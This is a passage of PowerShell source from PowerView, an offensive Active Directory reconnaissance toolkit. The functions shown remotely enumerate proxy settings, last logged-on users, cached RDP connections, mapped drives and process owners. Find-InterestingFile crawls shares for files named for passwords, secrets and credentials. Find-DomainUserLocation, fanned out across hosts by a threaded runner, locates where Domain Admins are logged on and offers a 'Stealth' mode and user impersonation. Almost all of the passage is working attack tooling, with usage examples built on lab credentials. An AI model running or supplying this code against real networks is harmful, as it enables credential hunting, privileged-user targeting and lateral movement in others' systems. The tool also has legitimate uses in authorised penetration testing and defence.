        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $WmiArguments = @{
                    'List' = $True
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = $Computer
                    'ErrorAction' = 'Stop'
                }
                if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

                $RegProvider = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'

                # HKEY_CURRENT_USER
                $HKCU = 2147483649
                $ProxyServer = $RegProvider.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
                $AutoConfigURL = $RegProvider.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue

                $Wpad = ''
                if ($AutoConfigURL -and ($AutoConfigURL -ne '')) {
                    try {
                        $Wpad = (New-Object Net.WebClient).DownloadString($AutoConfigURL)
                    }
                    catch {
                        Write-Warning "[Get-WMIRegProxy] Error connecting to AutoConfigURL : $AutoConfigURL"
                    }
                }

                if ($ProxyServer -or $AutoConfigUrl) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'ComputerName' $Computer
                    $Out | Add-Member Noteproperty 'ProxyServer' $ProxyServer
                    $Out | Add-Member Noteproperty 'AutoConfigURL' $AutoConfigURL
                    $Out | Add-Member Noteproperty 'Wpad' $Wpad
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    $Out
                }
                else {
                    Write-Warning "[Get-WMIRegProxy] No proxy settings found for $ComputerName"
                }
            }
            catch {
                Write-Warning "[Get-WMIRegProxy] Error enumerating proxy settings for $ComputerName : $_"
            }
        }
    }
}


function Get-WMIRegLastLoggedOn {
<#
.SYNOPSIS

Returns the last user who logged onto the local (or a remote) machine.

Note: This function requires administrative rights on the machine you're enumerating.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function uses remote registry to enumerate the LastLoggedOnUser registry key
for the local (or remote) machine.

.PARAMETER ComputerName

Specifies the hostname to query for remote registry values (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegLastLoggedOn

Returns the last user logged onto the local machine.

.EXAMPLE

Get-WMIRegLastLoggedOn -ComputerName WINDOWS1

Returns the last user logged onto WINDOWS1

.EXAMPLE

Get-DomainComputer | Get-WMIRegLastLoggedOn

Returns the last user logged onto all machines in the domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-WMIRegLastLoggedOn -ComputerName PRIMARY.testlab.local -Credential $Cred

.OUTPUTS

PowerView.LastLoggedOnUser

A PSCustomObject containing the ComputerName and last loggedon user.
#>

    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # HKEY_LOCAL_MACHINE
            $HKLM = 2147483650

            $WmiArguments = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $Computer
                'ErrorAction' = 'SilentlyContinue'
            }
            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

            # try to open up the remote registry key to grab the last logged on user
            try {
                $Reg = Get-WmiObject @WmiArguments

                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                $Value = 'LastLoggedOnUser'
                $LastUser = $Reg.GetStringValue($HKLM, $Key, $Value).sValue

                $LastLoggedOn = New-Object PSObject
                $LastLoggedOn | Add-Member Noteproperty 'ComputerName' $Computer
                $LastLoggedOn | Add-Member Noteproperty 'LastLoggedOn' $LastUser
                $LastLoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                $LastLoggedOn
            }
            catch {
                Write-Warning "[Get-WMIRegLastLoggedOn] Error opening remote registry on $Computer. Remote registry likely not enabled."
            }
        }
    }
}


function Get-WMIRegCachedRDPConnection {
<#
.SYNOPSIS

Returns information about RDP connections outgoing from the local (or remote) machine.

Note: This function requires administrative rights on the machine you're enumerating.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: ConvertFrom-SID  

.DESCRIPTION

Uses remote registry functionality to query all entries for the
"Windows Remote Desktop Connection Client" on a machine, separated by
user and target server.

.PARAMETER ComputerName

Specifies the hostname to query for cached RDP connections (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegCachedRDPConnection

Returns the RDP connection client information for the local machine.

.EXAMPLE

Get-WMIRegCachedRDPConnection  -ComputerName WINDOWS2.testlab.local

Returns the RDP connection client information for the WINDOWS2.testlab.local machine

.EXAMPLE

Get-DomainComputer | Get-WMIRegCachedRDPConnection

Returns cached RDP information for all machines in the domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-WMIRegCachedRDPConnection -ComputerName PRIMARY.testlab.local -Credential $Cred

.OUTPUTS

PowerView.CachedRDPConnection

A PSCustomObject containing the ComputerName and cached RDP information.
#>

    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # HKEY_USERS
            $HKU = 2147483651

            $WmiArguments = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $Computer
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

            try {
                $Reg = Get-WmiObject @WmiArguments

                # extract out the SIDs of domain users in this hive
                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }

                        # pull out all the cached RDP connections
                        $ConnectionKeys = $Reg.EnumValues($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Default").sNames

                        ForEach ($Connection in $ConnectionKeys) {
                            # make sure this key is a cached connection
                            if ($Connection -match 'MRU.*') {
                                $TargetServer = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Default", $Connection).sValue

                                $FoundConnection = New-Object PSObject
                                $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer
                                $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
                                $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
                                $FoundConnection | Add-Member Noteproperty 'TargetServer' $TargetServer
                                $FoundConnection | Add-Member Noteproperty 'UsernameHint' $Null
                                $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                $FoundConnection
                            }
                        }

                        # pull out all the cached server info with username hints
                        $ServerKeys = $Reg.EnumKey($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Servers").sNames

                        ForEach ($Server in $ServerKeys) {

                            $UsernameHint = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Servers\$Server", 'UsernameHint').sValue

                            $FoundConnection = New-Object PSObject
                            $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer
                            $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
                            $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
                            $FoundConnection | Add-Member Noteproperty 'TargetServer' $Server
                            $FoundConnection | Add-Member Noteproperty 'UsernameHint' $UsernameHint
                            $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            $FoundConnection
                        }
                    }
                    catch {
                        Write-Verbose "[Get-WMIRegCachedRDPConnection] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[Get-WMIRegCachedRDPConnection] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function Get-WMIRegMountedDrive {
<#
.SYNOPSIS

Returns information about saved network mounted drives for the local (or remote) machine.

Note: This function requires administrative rights on the machine you're enumerating.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: ConvertFrom-SID  

.DESCRIPTION

Uses remote registry functionality to enumerate recently mounted network drives.

.PARAMETER ComputerName

Specifies the hostname to query for mounted drive information (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegMountedDrive

Returns the saved network mounted drives for the local machine.

.EXAMPLE

Get-WMIRegMountedDrive -ComputerName WINDOWS2.testlab.local

Returns the saved network mounted drives for the WINDOWS2.testlab.local machine

.EXAMPLE

Get-DomainComputer | Get-WMIRegMountedDrive

Returns the saved network mounted drives for all machines in the domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-WMIRegMountedDrive -ComputerName PRIMARY.testlab.local -Credential $Cred

.OUTPUTS

PowerView.RegMountedDrive

A PSCustomObject containing the ComputerName and mounted drive information.
#>

    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # HKEY_USERS
            $HKU = 2147483651

            $WmiArguments = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $Computer
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

            try {
                $Reg = Get-WmiObject @WmiArguments

                # extract out the SIDs of domain users in this hive
                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }

                        $DriveLetters = ($Reg.EnumKey($HKU, "$UserSID\Network")).sNames

                        ForEach ($DriveLetter in $DriveLetters) {
                            $ProviderName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'ProviderName').sValue
                            $RemotePath = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'RemotePath').sValue
                            $DriveUserName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'UserName').sValue
                            if (-not $UserName) { $UserName = '' }

                            if ($RemotePath -and ($RemotePath -ne '')) {
                                $MountedDrive = New-Object PSObject
                                $MountedDrive | Add-Member Noteproperty 'ComputerName' $Computer
                                $MountedDrive | Add-Member Noteproperty 'UserName' $UserName
                                $MountedDrive | Add-Member Noteproperty 'UserSID' $UserSID
                                $MountedDrive | Add-Member Noteproperty 'DriveLetter' $DriveLetter
                                $MountedDrive | Add-Member Noteproperty 'ProviderName' $ProviderName
                                $MountedDrive | Add-Member Noteproperty 'RemotePath' $RemotePath
                                $MountedDrive | Add-Member Noteproperty 'DriveUserName' $DriveUserName
                                $MountedDrive.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                $MountedDrive
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[Get-WMIRegMountedDrive] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[Get-WMIRegMountedDrive] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function Get-WMIProcess {
<#
.SYNOPSIS

Returns a list of processes and their owners on the local or remote machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Uses Get-WMIObject to enumerate all Win32_process instances on the local or remote machine,
including the owners of the particular process.

.PARAMETER ComputerName

Specifies the hostname to query for cached RDP connections (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

Get-WMIProcess -ComputerName WINDOWS1

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-WMIProcess -ComputerName PRIMARY.testlab.local -Credential $Cred

.OUTPUTS

PowerView.UserProcess

A PSCustomObject containing the remote process information.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $WmiArguments = @{
                    'ComputerName' = $ComputerName
                    'Class' = 'Win32_process'
                }
                if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $Owner = $_.getowner();
                    $Process = New-Object PSObject
                    $Process | Add-Member Noteproperty 'ComputerName' $Computer
                    $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $Process | Add-Member Noteproperty 'Domain' $Owner.Domain
                    $Process | Add-Member Noteproperty 'User' $Owner.User
                    $Process.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    $Process
                }
            }
            catch {
                Write-Verbose "[Get-WMIProcess] Error enumerating remote processes on '$Computer', access likely denied: $_"
            }
        }
    }
}


function Find-InterestingFile {
<#
.SYNOPSIS

Searches for files on the given path that match a series of specified criteria.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection  

.DESCRIPTION

This function recursively searches a given UNC path for files with
specific keywords in the name (default of pass, sensitive, secret, admin,
login and unattend*.xml). By default, hidden files/folders are included
in search results. If -Credential is passed, Add-RemoteConnection/Remove-RemoteConnection
is used to temporarily map the remote share.

.PARAMETER Path

UNC/local path to recursively search.

.PARAMETER Include

Only return files/folders that match the specified array of strings,
i.e. @(*.doc*, *.xls*, *.ppt*)

.PARAMETER LastAccessTime

Only return files with a LastAccessTime greater than this date value.

.PARAMETER LastWriteTime

Only return files with a LastWriteTime greater than this date value.

.PARAMETER CreationTime

Only return files with a CreationTime greater than this date value.

.PARAMETER OfficeDocs

Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)

.PARAMETER FreshEXEs

Switch. Find .EXEs accessed within the last 7 days.

.PARAMETER ExcludeFolders

Switch. Exclude folders from the search results.

.PARAMETER ExcludeHidden

Switch. Exclude hidden files and folders from the search results.

.PARAMETER CheckWriteAccess

Switch. Only returns files the current user has write access to.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
to connect to remote systems for file enumeration.

.EXAMPLE

Find-InterestingFile -Path "C:\Backup\"

Returns any files on the local path C:\Backup\ that have the default
search term set in the title.

.EXAMPLE

Find-InterestingFile -Path "\\WINDOWS7\Users\" -LastAccessTime (Get-Date).AddDays(-7)

Returns any files on the remote path \\WINDOWS7\Users\ that have the default
search term set in the title and were accessed within the last week.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-InterestingFile -Credential $Cred -Path "\\PRIMARY.testlab.local\C$\Temp\"

.OUTPUTS

PowerView.FoundFile
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $ExcludeFolders,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments =  @{
            'Recurse' = $True
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $Include
        }
        if ($PSBoundParameters['OfficeDocs']) {
            $SearcherArguments['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($PSBoundParameters['FreshEXEs']) {
            # find .exe's accessed within the last 7 days
            $LastAccessTime = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $SearcherArguments['Include'] = @('*.exe')
        }
        $SearcherArguments['Force'] = -not $PSBoundParameters['ExcludeHidden']

        $MappedComputers = @{}

        function Test-Write {
            # short helper to check is the current user can write to a file
            [CmdletBinding()]Param([String]$Path)
            try {
                $Filetest = [IO.File]::OpenWrite($Path)
                $Filetest.Close()
                $True
            }
            catch {
                $False
            }
        }
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $HostComputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    # map IPC$ to this computer if it's not already
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            $SearcherArguments['Path'] = $TargetPath
            Get-ChildItem @SearcherArguments | ForEach-Object {
                # check if we're excluding folders
                $Continue = $True
                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $Continue = $False
                }
                if ($LastAccessTime -and ($_.LastAccessTime -lt $LastAccessTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $LastWriteTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $CreationTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (Test-Write -Path $_.FullName))) {
                    $Continue = $False
                }
                if ($Continue) {
                    $FileParams = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $FoundFile = New-Object -TypeName PSObject -Property $FileParams
                    $FoundFile.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $FoundFile
                }
            }
        }
    }

    END {
        # remove the IPC$ mappings
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


########################################################
#
# 'Meta'-functions start below
#
########################################################

function New-ThreadedFunction {
    # Helper used by any threaded host enumeration functions
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $ComputerName,

        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,

        [Parameter(Position = 2)]
        [Hashtable]
        $ScriptParameters,

        [Int]
        [ValidateRange(1,  100)]
        $Threads = 20,

        [Switch]
        $NoImports
    )

    BEGIN {
        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()

        # # $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
        # force a single-threaded apartment state (for token-impersonation stuffz)
        $SessionState.ApartmentState = [System.Threading.ApartmentState]::STA

        # import the current session state's variables and functions so the chained PowerView
        #   functionality can be used by the threaded blocks
        if (-not $NoImports) {
            # grab all the current variables for this runspace
            $MyVars = Get-Variable -Scope 2

            # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
            $VorbiddenVars = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')

            # add Variables from Parent Scope (current runspace) into the InitialSessionState
            ForEach ($Var in $MyVars) {
                if ($VorbiddenVars -NotContains $Var.Name) {
                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }

            # add Functions from current runspace to the InitialSessionState
            ForEach ($Function in (Get-ChildItem Function:)) {
                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        #   Thanks Carlos!

        # create a pool of maxThread runspaces
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()

        # do some trickery to get the proper BeginInvoke() method that allows for an output queue
        $Method = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $MethodParameters = $M.GetParameters()
            if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq 'input' -and $MethodParameters[1].Name -eq 'output') {
                $Method = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }

        $Jobs = @()
        $ComputerName = $ComputerName | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count)"

        # partition all hosts from -ComputerName into $Threads number of groups
        if ($Threads -ge $ComputerName.Length) {
            $Threads = $ComputerName.Length
        }
        $ElementSplitSize = [Int]($ComputerName.Length/$Threads)
        $ComputerNamePartitioned = @()
        $Start = 0
        $End = $ElementSplitSize

        for($i = 1; $i -le $Threads; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $Threads) {
                $End = $ComputerName.Length
            }
            $List.AddRange($ComputerName[$Start..($End-1)])
            $Start += $ElementSplitSize
            $End += $ElementSplitSize
            $ComputerNamePartitioned += @(,@($List.ToArray()))
        }

        Write-Verbose "[New-ThreadedFunction] Total number of threads/partitions: $Threads"

        ForEach ($ComputerNamePartition in $ComputerNamePartitioned) {
            # create a "powershell pipeline runner"
            $PowerShell = [PowerShell]::Create()
            $PowerShell.runspacepool = $Pool

            # add the script block + arguments with the given computer partition
            $Null = $PowerShell.AddScript($ScriptBlock).AddParameter('ComputerName', $ComputerNamePartition)
            if ($ScriptParameters) {
                ForEach ($Param in $ScriptParameters.GetEnumerator()) {
                    $Null = $PowerShell.AddParameter($Param.Name, $Param.Value)
                }
            }

            # create the output queue
            $Output = New-Object Management.Automation.PSDataCollection[Object]

            # kick off execution using the BeginInvok() method that allows queues
            $Jobs += @{
                PS = $PowerShell
                Output = $Output
                Result = $Method.Invoke($PowerShell, @($Null, [Management.Automation.PSDataCollection[Object]]$Output))
            }
        }
    }

    END {
        Write-Verbose "[New-ThreadedFunction] Threads executing"

        # continuously loop through each job queue, consuming output as appropriate
        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)

        $SleepSeconds = 100
        Write-Verbose "[New-ThreadedFunction] Waiting $SleepSeconds seconds for final cleanup..."

        # cleanup- make sure we didn't miss anything
        for ($i=0; $i -lt $SleepSeconds; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }

        $Pool.Dispose()
        Write-Verbose "[New-ThreadedFunction] all threads completed"
    }
}


function Find-DomainUserLocation {
<#
.SYNOPSIS

Finds domain machines where specific users are logged into.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainFileServer, Get-DomainDFSShare, Get-DomainController, Get-DomainComputer, Get-DomainUser, Get-DomainGroupMember, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetSession, Test-AdminAccess, Get-NetLoggedon, Resolve-IPAddress, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and queries the domain for users of a specified group
(default 'Domain Admins') with Get-DomainGroupMember. Then for each server the
function enumerates any active user sessions with Get-NetSession/Get-NetLoggedon
The found user list is compared against the target list, and any matches are
displayed. If -ShowAll is specified, all results are displayed instead of
the filtered set. If -Stealth is specified, then likely highly-trafficed servers
are enumerated with Get-DomainFileServer/Get-DomainController, and session
enumeration is executed only against those servers. If -Credential is passed,
then Invoke-UserImpersonation is used to impersonate the specified user
before enumeration, reverting after with Invoke-RevertToSelf.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER Domain

Specifies the domain to query for computers AND users, defaults to the current domain.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER ComputerUnconstrained

Switch. Search computer objects that have unconstrained delegation.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER UserIdentity

Specifies one or more user identities to search for.

.PARAMETER UserDomain

Specifies the domain to query for users to search for, defaults to the current domain.

.PARAMETER UserLDAPFilter

Specifies an LDAP query string that is used to search for target users.

.PARAMETER UserSearchBase

Specifies the LDAP source to search through for target users.
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER UserGroupIdentity

Specifies a group identity to query for target users, defaults to 'Domain Admins.
If any other user specifications are set, then UserGroupIdentity is ignored.

.PARAMETER UserAdminCount

Switch. Search for users users with '(adminCount=1)' (meaning are/were privileged).

.PARAMETER UserAllowDelegation

Switch. Search for user accounts that are not marked as 'sensitive and not allowed for delegation'.

.PARAMETER CheckAccess

Switch. Check if the current user has local admin access to computers where target users are found.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

